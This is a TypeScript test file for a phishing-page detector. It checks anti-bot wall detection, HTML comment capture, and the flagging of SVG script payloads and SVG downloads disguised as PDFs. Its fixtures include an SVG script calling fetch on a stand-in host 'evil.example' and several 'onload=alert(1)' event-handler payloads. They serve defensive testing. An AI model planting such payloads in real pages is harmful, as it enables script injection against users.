/**
 * REC 4 — cloaking-as-signal, fetcher-side marker extraction
 * (`lib/page-fetch.ts` `parseSuspectHtml` + the `cf-mitigated` header
 * reconciliation in `fetchSuspectPage`).
 *
 * `parseSuspectHtml` streams HTML through the real Workers-runtime global
 * `HTMLRewriter`, which is NOT present in this package's plain-node vitest
 * environment (no `@cloudflare/vitest-pool-workers` / miniflare pool wired
 * up here — confirmed via package.json, same class of gap noted in
 * test/phishing-pattern-writer.test.ts and test/velocity-writer.test.ts for
 * the missing D1 harness). `test/page-fetch-ssrf.test.ts` already works
 * around this by never calling `parseSuspectHtml` directly.
 *
 * To exercise the actual marker-extraction + precedence logic against real
 * fixture HTML (rather than skip it), this file installs a MINIMAL,
 * test-only `HTMLRewriter` polyfill scoped to exactly the selectors
 * `parseSuspectHtml` registers (`input`, `[class]`, `form`, `img`,
 * `script`, `link`, `meta`, `title`, `body`, plus — Lane 3 §3.2 — the
 * document-wide `onDocument({ comments })` handler, and the `svg` /
 * `svg *` / `a` element selectors the C1 `svg_script_payload` extraction
 * uses, whose `on*` test now walks the real `Element.attributes`). It
 * is a plain tag/attribute tokenizer over CONTROLLED fixture strings —
 * not a general HTML parser, and not subject to the SSRF-attacker-input
 * regex constraints that govern the real fetcher (this never runs on
 * live/attacker HTML). It is installed only for the duration of this file
 * (afterAll restores the prior global) so it cannot leak into other test
 * files.
 *
 * `svg *` support is a real (if minimal) descendant match: the tokenizer
 * tracks the open-tag ancestor stack the same way it already does for
 * text() scoping, and `svg *` matches whenever `svg` is anywhere in that
 * stack at element-open time — i.e. an actual descendant check, not a
 * hardcoded pass. It does NOT implement general CSS combinators (no `>`,
 * no multi-level compound selectors) because `parseSuspectHtml` never
 * registers any — extending further than the real caller uses would be
 * faking coverage rather than proving it.
 *
 * `comments()` support is equally narrow but honest: HTMLRewriter's own
 * contract is that a comment is delivered as ONE whole `c.text` (never
 * chunked the way text() is), which is exactly what the A5
 * `agent_scaffold_comment` rule depends on (single-comment scoping) — so
 * the fake's comment handling (extract everything between `<!--` and
 * `-->`, fire once) matches the real handler's delivery shape, not just
 * its selector string.
 *
 * If a real workers pool is ever wired into this package, this shim can be
 * deleted in favor of running these same fixtures against the genuine
 * HTMLRewriter — the assertions below describe the real contract either way.
 */

import { describe, it, expect, beforeAll, afterAll } from "vitest";
import {
  parseSuspectHtml,
  fetchSuspectPage,
  MAX_COMMENT_SAMPLE,
  MAX_COMMENTS,
  type FetchDeps,
} from "../src/lib/page-fetch";

// ─── Minimal HTMLRewriter test double ─────────────────────────────────────

type ElementHandler = {
  tagName: string;
  getAttribute(name: string): string | null;
  /**
   * Mirrors the real `Element.attributes: IterableIterator<string[]>`
   * (@cloudflare/workers-types `index.d.ts`) — each entry is a
   * `[name, value]` pair with the name lowercased, as the runtime
   * delivers it. `parseSuspectHtml` walks this for the `on*` prefix test
   * that replaced the guessed closed list of SVG event attributes.
   */
  readonly attributes: IterableIterator<string[]>;
};
type CommentHandler = { text: string };
type Handler = {
  element?: (el: ElementHandler) => void;
  text?: (t: { text: string }) => void;
  comments?: (c: CommentHandler) => void;
};
/** `onDocument` handlers — document-wide, no selector. */
type DocumentHandler = { comments?: (c: CommentHandler) => void };

const VOID_TAGS = new Set(["input", "img", "link", "meta", "br", "hr"]);

/**
 * Selector matcher. Covers exactly what parseSuspectHtml registers — a
 * bare tag name, the `[class]` attribute-presence selector, and the
 * `svg *` descendant selector (real ancestor-stack check, see file
 * header). Nothing beyond that: a wider selector grammar here would be
 * unexercised code pretending to be coverage.
 */
function selectorMatches(
  selector: string,
  tagName: string,
  attrs: Record<string, string>,
  ancestorStack: readonly string[],
): boolean {
  if (selector === tagName) return true;
  if (selector === "[class]") return "class" in attrs;
  if (selector === "svg *") return ancestorStack.includes("svg");
  return false;
}

function runFakeRewrite(
  html: string,
  regs: Array<{ selector: string; handler: Handler }>,
  docRegs: DocumentHandler[],
): void {
  const stack: string[] = [];

  const fireElement = (tagName: string, attrs: Record<string, string>) => {
    const el: ElementHandler = {
      tagName,
      getAttribute: (name: string) => {
        const key = name.toLowerCase();
        return Object.prototype.hasOwnProperty.call(attrs, key) ? (attrs[key] ?? null) : null;
      },
      // A FRESH iterator per access, like the runtime's.
      get attributes(): IterableIterator<string[]> {
        return Object.entries(attrs).map(([k, v]): string[] => [k, v])[Symbol.iterator]();
      },
    };
    for (const { selector, handler } of regs) {
      if (selectorMatches(selector, tagName, attrs, stack) && handler.element) handler.element(el);
    }
  };

  const fireText = (text: string) => {
    if (!text) return;
    const active = new Set(stack);
    for (const { selector, handler } of regs) {
      if (handler.text && active.has(selector)) handler.text({ text });
    }
  };

  // Lane 3 §3.2 — HTMLRewriter delivers a comment as ONE whole `c.text`
  // (never chunked like text()), which is exactly the delivery shape the
  // A5 single-comment scoping rule depends on. The real parser registers
  // its comments() handler via `onDocument`, NOT via a selector, so it
  // fires document-wide — including for comments with no open element
  // ancestor (before <!DOCTYPE>/<html>, after </html>), which is where
  // builder banner comments live and which the old `.on('*')`
  // registration could never reach.
  const fireComment = (text: string) => {
    for (const handler of docRegs) {
      if (handler.comments) handler.comments({ text });
    }
  };

  let i = 0;
  const n = html.length;
  while (i < n) {
    const lt = html.indexOf("<", i);
    if (lt === -1) {
      fireText(html.slice(i));
      break;
    }
    if (lt > i) fireText(html.slice(i, lt));

    if (html.startsWith("<!--", lt)) {
      const end = html.indexOf("-->", lt + 4);
      const commentText = end === -1 ? html.slice(lt + 4) : html.slice(lt + 4, end);
      fireComment(commentText);
      i = end === -1 ? n : end + 3;
      continue;
    }
    const gt = html.indexOf(">", lt);
    if (gt === -1) break;
    const raw = html.slice(lt + 1, gt);
    i = gt + 1;
    if (!raw || raw.startsWith("!") || raw.startsWith("?")) continue;

    if (raw.startsWith("/")) {
      const name = raw.slice(1).trim().toLowerCase();
      const idx = stack.lastIndexOf(name);
      if (idx !== -1) stack.splice(idx, stack.length - idx);
      continue;
    }

    let body = raw.trim();
    let selfClosing = false;
    if (body.endsWith("/")) {
      selfClosing = true;
      body = body.slice(0, -1).trim();
    }
    const nameMatch = /^([a-zA-Z][a-zA-Z0-9]*)/.exec(body);
    if (!nameMatch) continue;
    const matchedName = nameMatch[1]!;
    const name = matchedName.toLowerCase();
    const attrsStr = body.slice(matchedName.length);
    const attrs: Record<string, string> = {};
    const attrRe = /([a-zA-Z0-9_:-]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'=<>`]+)))?/g;
    let am: RegExpExecArray | null;
    while ((am = attrRe.exec(attrsStr))) {
      const key = am[1]!.toLowerCase();
      attrs[key] = am[2] ?? am[3] ?? am[4] ?? "";
    }

    fireElement(name, attrs);
    if (!selfClosing && !VOID_TAGS.has(name)) stack.push(name);
  }
}

class FakeHTMLRewriter {
  private regs: Array<{ selector: string; handler: Handler }> = [];
  private docRegs: DocumentHandler[] = [];
  on(selector: string, handler: Handler): this {
    this.regs.push({ selector, handler });
    return this;
  }
  onDocument(handler: DocumentHandler): this {
    this.docRegs.push(handler);
    return this;
  }
  transform(response: Response): { arrayBuffer(): Promise<ArrayBuffer> } {
    const regs = this.regs;
    const docRegs = this.docRegs;
    return {
      async arrayBuffer(): Promise<ArrayBuffer> {
        const buf = await response.arrayBuffer();
        const html = new TextDecoder().decode(buf);
        runFakeRewrite(html, regs, docRegs);
        return new ArrayBuffer(0);
      },
    };
  }
}

let priorHTMLRewriter: unknown;

beforeAll(() => {
  priorHTMLRewriter = (globalThis as Record<string, unknown>).HTMLRewriter;
  (globalThis as Record<string, unknown>).HTMLRewriter = FakeHTMLRewriter;
});

afterAll(() => {
  (globalThis as Record<string, unknown>).HTMLRewriter = priorHTMLRewriter;
});

function bytes(html: string): Uint8Array {
  return new TextEncoder().encode(html);
}

// ─── Per-family marker extraction ─────────────────────────────────────────

describe("parseSuspectHtml — antiBotWall marker extraction per fetcher family", () => {
  it("turnstile: detected via cf-turnstile class", async () => {
    const html = `<html><body><div class="cf-turnstile" data-sitekey="x"></div></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.antiBotWall).toBe("turnstile");
  });

  it("turnstile: detected via challenges.cloudflare.com script src", async () => {
    const html = `<html><head><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script></head><body></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.antiBotWall).toBe("turnstile");
  });

  it("class matching is whole-token: a widget class among other classes still matches", async () => {
    const html = `<html><body><div class="row g-recaptcha mt-2"></div></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.antiBotWall).toBe("recaptcha");
  });

  it("class matching is whole-token: benign fragments do NOT collide (search-captcha, flag-recaptcha)", async () => {
    // Bare substring matching would falsely fire here — the vendor token must
    // be a whole class token delimited by whitespace/ends.
    const html = `<html><body>
      <div class="search-captcha-widget"></div>
      <div class="flag-recaptcha-badge"></div>
      <div class="xcf-turnstile-thing"></div>
    </body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.antiBotWall).toBeNull();
  });

  it("recaptcha: detected via g-recaptcha class", async () => {
    const html = `<html><body><div class="g-recaptcha" data-sitekey="y"></div></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.antiBotWall).toBe("recaptcha");
  });

  it("recaptcha: detected via recaptcha script src", async () => {
    const html = `<html><head><script src="https://www.google.com/recaptcha/api.js"></script></head><body></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.antiBotWall).toBe("recaptcha");
  });

  it("hcaptcha: detected via h-captcha class", async () => {
    const html = `<html><body><div class="h-captcha" data-sitekey="z"></div></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.antiBotWall).toBe("hcaptcha");
  });

  it("hcaptcha: detected via hcaptcha.com script src", async () => {
    const html = `<html><head><script src="https://hcaptcha.com/1/api.js"></script></head><body></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.antiBotWall).toBe("hcaptcha");
  });

  it("cf_challenge: detected via /cdn-cgi/challenge-platform/ script src", async () => {
    const html = `<html><head><script src="/cdn-cgi/challenge-platform/h/g/orchestrate/jsch/v1"></script></head><body></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.antiBotWall).toBe("cf_challenge");
  });

  it("cf_challenge: detected via a title interstitial phrase (\"Just a moment\") with no widget markers", async () => {
    const html = `<html><head><title>Just a moment...</title></head><body>Please wait</body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.antiBotWall).toBe("cf_challenge");
  });

  it("cf_challenge: detected via a body interstitial phrase (\"checking your browser\")", async () => {
    const html = `<html><head><title>Redirecting</title></head><body>Checking your browser before continuing.</body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.antiBotWall).toBe("cf_challenge");
  });

  it("clean page: no widget, no challenge script, no interstitial phrase -> antiBotWall is null", async () => {
    const html = `<html><head><title>Acme — Sign in</title></head><body><form action="/login"><input type="password" /></form></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.antiBotWall).toBeNull();
  });
});

// ─── Precedence: widget families outrank cf_challenge ─────────────────────

describe("parseSuspectHtml — antiBotWall family precedence", () => {
  it("a widget (turnstile class) appearing BEFORE a generic cf_challenge script wins", async () => {
    const html = `
      <html><body>
        <div class="cf-turnstile"></div>
        <script src="/cdn-cgi/challenge-platform/h/g/orchestrate/jsch/v1"></script>
      </body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.antiBotWall).toBe("turnstile");
  });

  it("a widget (recaptcha script) appearing AFTER a generic cf_challenge script still wins (rank, not document order)", async () => {
    const html = `
      <html><body>
        <script src="/cdn-cgi/challenge-platform/h/g/orchestrate/jsch/v1"></script>
        <script src="https://www.google.com/recaptcha/api.js"></script>
      </body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.antiBotWall).toBe("recaptcha");
  });

  it("hcaptcha class beats a cf_challenge interstitial phrase present in the same page", async () => {
    const html = `<html><head><title>Just a moment...</title></head><body><div class="h-captcha"></div></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.antiBotWall).toBe("hcaptcha");
  });

  // Rank precedence is now order-independent on BOTH hooks: the `[class]`
  // hook was given the same `wallRank(candidate) < wallRank(antiBotWall)`
  // upgrade check the `script` hook already had, so a widget class marker
  // upgrades a cf_challenge recorded earlier in document order. (Previously
  // the `[class]` hook's blunt "if (antiBotWall) return;" made this
  // order-dependent — a cf_challenge script seen first would incorrectly
  // stick. Fixed alongside these tests.)
  it("a cf_challenge script encountered BEFORE a turnstile class IS upgraded by the later widget marker (rank, not document order)", async () => {
    const html = `
      <html><body>
        <script src="/cdn-cgi/challenge-platform/h/g/orchestrate/jsch/v1"></script>
        <div class="cf-turnstile"></div>
      </body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.antiBotWall).toBe("turnstile");
  });
});

// ─── cf-mitigated response header (fetchSuspectPage orchestration) ────────

function htmlResponse(body: string, headers: Record<string, string> = {}): Response {
  return new Response(body, {
    status: 200,
    headers: { "content-type": "text/html; charset=utf-8", ...headers },
  });
}

function makeDeps(fetchImpl: (url: string) => Response): FetchDeps {
  return {
    resolve: async () => ["93.184.216.34"],
    fetchImpl: async (url: string) => fetchImpl(url),
  };
}

describe("fetchSuspectPage — cf-mitigated header only fills an empty slot", () => {
  it("a cf-mitigated: challenge header sets cf_challenge on an otherwise-clean page", async () => {
    const deps = makeDeps(() =>
      htmlResponse(`<html><body>hello</body></html>`, { "cf-mitigated": "challenge" }),
    );
    const r = await fetchSuspectPage("acme-secure-login.com", { deps });
    expect(r.ok).toBe(true);
    expect(r.signals?.antiBotWall).toBe("cf_challenge");
    expect(r.cfMitigated).toBe("challenge");
  });

  it("a cf-mitigated header does NOT override a widget family already found in the HTML", async () => {
    const deps = makeDeps(() =>
      htmlResponse(`<html><body><div class="cf-turnstile"></div></body></html>`, {
        "cf-mitigated": "challenge",
      }),
    );
    const r = await fetchSuspectPage("acme-secure-login.com", { deps });
    expect(r.ok).toBe(true);
    expect(r.signals?.antiBotWall).toBe("turnstile");
  });

  it("no cf-mitigated header and no in-HTML marker leaves antiBotWall null", async () => {
    const deps = makeDeps(() => htmlResponse(`<html><body>hello</body></html>`));
    const r = await fetchSuspectPage("acme-secure-login.com", { deps });
    expect(r.ok).toBe(true);
    expect(r.signals?.antiBotWall).toBeNull();
  });
});

// ─── Lane 3 §3.2 — HTML comment accumulator ────────────────────────────────
// HTML comments were previously COMPLETELY invisible to this parser (no
// comments() handler existed anywhere). These are the carrier for A5
// `agent_scaffold_comment` and part of A4 `build_placeholder_text`.

describe("parseSuspectHtml — comment accumulator (Lane 3 §3.2)", () => {
  it("captures a single HTML comment's full text as one commentSamples entry", async () => {
    const html = `<html><body><!-- TODO: wire up the real backend --></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.commentSamples).toEqual([" TODO: wire up the real backend "]);
  });

  it("keeps separate comments as SEPARATE array entries, never concatenated into one blob", async () => {
    // This is the extraction-level half of the A5 single-comment-scoping
    // guarantee: the scorer's matchAgentScaffoldComment only sees a fired
    // signal when the structure lives inside ONE comment, which is only
    // possible if the fetcher hands it comments as discrete entries.
    const html = `<html><body><!-- fixme: wire auth --><p>hi</p><!-- fixme: add tests --></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.commentSamples).toHaveLength(2);
    expect(s.commentSamples[0]).toContain("fixme: wire auth");
    expect(s.commentSamples[1]).toContain("fixme: add tests");
    // Neither slice contains the other's text — proves no cross-comment bleed.
    expect(s.commentSamples[0]).not.toContain("add tests");
    expect(s.commentSamples[1]).not.toContain("wire auth");
  });

  it("truncates a single comment at the MAX_COMMENT_SAMPLE budget", async () => {
    const long = "x".repeat(MAX_COMMENT_SAMPLE + 808);
    const html = `<html><body><!--${long}--></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.commentSamples).toHaveLength(1);
    expect(s.commentSamples[0]!.length).toBe(MAX_COMMENT_SAMPLE);
  });

  it("caps the number of retained comment slices at MAX_COMMENTS", async () => {
    const comments = Array.from(
      { length: MAX_COMMENTS + 6 },
      (_, i) => `<!-- c${i} -->`,
    ).join("");
    const html = `<html><body>${comments}</body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.commentSamples).toHaveLength(MAX_COMMENTS);
  });

  it("captures a comment in the document PROLOGUE (before <!DOCTYPE>/<html>) and EPILOGUE (after </html>)", async () => {
    // The regression this pins: `.on('*', { comments })` matched ELEMENTS,
    // so a comment with no open element ancestor was never delivered —
    // and that is exactly where builder banner comments sit.
    const html =
      `<!-- Generated by ExampleBuilder 4.2 --><!DOCTYPE html>` +
      `<html><body><p>hi</p></body></html>` +
      `<!-- build id: 9f2 -->`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.commentSamples).toHaveLength(2);
    expect(s.commentSamples[0]).toContain("Generated by ExampleBuilder 4.2");
    expect(s.commentSamples[1]).toContain("build id: 9f2");
  });

  it("a page with no comments returns an empty commentSamples array", async () => {
    const html = `<html><body>hello</body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.commentSamples).toEqual([]);
  });
});

// ─── Lane 3 §3.1 C1 — inline SVG payload extraction ────────────────────────

describe("parseSuspectHtml — svg_script_payload extraction (Lane 3 §3.1 C1)", () => {
  it("leg (a): an inline <svg> subtree containing <script> sets svgScriptPayload", async () => {
    const html = `<html><body><svg><script>fetch('https://evil.example/x')</script></svg></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.svgScriptPayload).toBe(true);
  });

  it("leg (a): an inline <svg> subtree containing <foreignObject> sets svgScriptPayload", async () => {
    const html = `<html><body><svg><foreignObject><div>x</div></foreignObject></svg></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.svgScriptPayload).toBe(true);
  });

  it("leg (a): an on* event attribute on a DESCENDANT of <svg> sets svgScriptPayload", async () => {
    const html = `<html><body><svg><circle onload="alert(1)" /></svg></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.svgScriptPayload).toBe(true);
  });

  it("leg (a): an on* event attribute on the <svg> element ITSELF sets svgScriptPayload", async () => {
    const html = `<html><body><svg onload="alert(1)"></svg></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.svgScriptPayload).toBe(true);
  });

  it("a plain <svg> with no script/foreignObject/on* attrs does NOT set svgScriptPayload", async () => {
    const html = `<html><body><svg><circle fill="red" cx="5" cy="5" r="4" /></svg></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.svgScriptPayload).toBe(false);
  });

  it("an on* attribute OUTSIDE any svg subtree does NOT set svgScriptPayload", async () => {
    const html = `<html><body><div onload="alert(1)"></div></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.svgScriptPayload).toBe(false);
  });

  // The on* test is a REAL prefix walk over Element.attributes, not a
  // guessed closed list. Each handler below was MISSING from the old
  // 12-entry list, on a weight-15 signal with a near-zero FP population.
  it.each([
    "onmouseout",
    "onpointerdown",
    "onwheel",
    "oninput",
    "onauxclick",
    "oncopy",
    "onscroll",
  ])("leg (a): %s inside an <svg> subtree sets svgScriptPayload", async (attr) => {
    const html = `<html><body><svg><circle ${attr}="alert(1)" /></svg></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.svgScriptPayload).toBe(true);
  });

  it("the on* walk is case-insensitive on the attribute NAME", async () => {
    const html = `<html><body><svg><circle OnPointerEnter="alert(1)" /></svg></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.svgScriptPayload).toBe(true);
  });

  it("an svg attribute that merely STARTS with a letter run is not mistaken for on* (opacity, origin)", async () => {
    const html = `<html><body><svg><circle opacity="0.5" origin="0 0" /></svg></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.svgScriptPayload).toBe(false);
  });

  it("leg (b): a[download] to a data:image/svg+xml URI disguised as a .pdf sets svgDownloadDisguise", async () => {
    const html = `<html><body><a download="invoice.pdf" href="data:image/svg+xml;base64,PHN2Zz4=">Download</a></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.svgDownloadDisguise).toBe(true);
  });

  it("leg (b) does NOT fire when the download filename isn't one of the disguised extensions", async () => {
    const html = `<html><body><a download="image.svg" href="data:image/svg+xml;base64,PHN2Zz4=">Download</a></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.svgDownloadDisguise).toBe(false);
  });

  it("leg (b) does NOT fire on a genuine .pdf download (href is not a data:image/svg+xml URI)", async () => {
    const html = `<html><body><a download="invoice.pdf" href="/files/invoice.pdf">Download</a></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.svgDownloadDisguise).toBe(false);
  });

  it("a link with no download attribute never sets svgDownloadDisguise, even with a data:image/svg+xml href", async () => {
    const html = `<html><body><a href="data:image/svg+xml;base64,PHN2Zz4=">no download attr</a></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.svgDownloadDisguise).toBe(false);
  });
});

// ─── Lane 3 §3.1 M1 — <meta name="generator"> capture + charset guard ─────

describe("parseSuspectHtml — metaGenerator capture", () => {
  it("captures the generator token", async () => {
    const html = `<html><head><meta name="generator" content="WordPress 6.5"></head><body></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.metaGenerator).toBe("WordPress 6.5");
  });

  it("strips markup/quote characters at CAPTURE — the column is a grouping dimension, and its render sinks (CSV export, briefing email, takedown-notice template) are not auto-escaping", async () => {
    const html = `<html><head><meta name="generator" content="Kit<builder 'v1' \`beta\`"></head><body></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.metaGenerator).toBe("Kitbuilder v1 beta");
  });

  it("strips control characters", async () => {
    const html = `<html><head><meta name="generator" content="Word\u0007Press\u0000"></head><body></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.metaGenerator).toBe("WordPress");
  });

  it("bounds the retained token at 64 chars", async () => {
    const long = "g".repeat(200);
    const html = `<html><head><meta name="generator" content="${long}"></head><body></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.metaGenerator!.length).toBe(64);
  });

  it("a generator made ENTIRELY of banned characters yields null, not an empty string", async () => {
    const html = `<html><head><meta name="generator" content="'''"></head><body></body></html>`;
    const s = await parseSuspectHtml(bytes(html));
    expect(s.metaGenerator).toBeNull();
  });
});
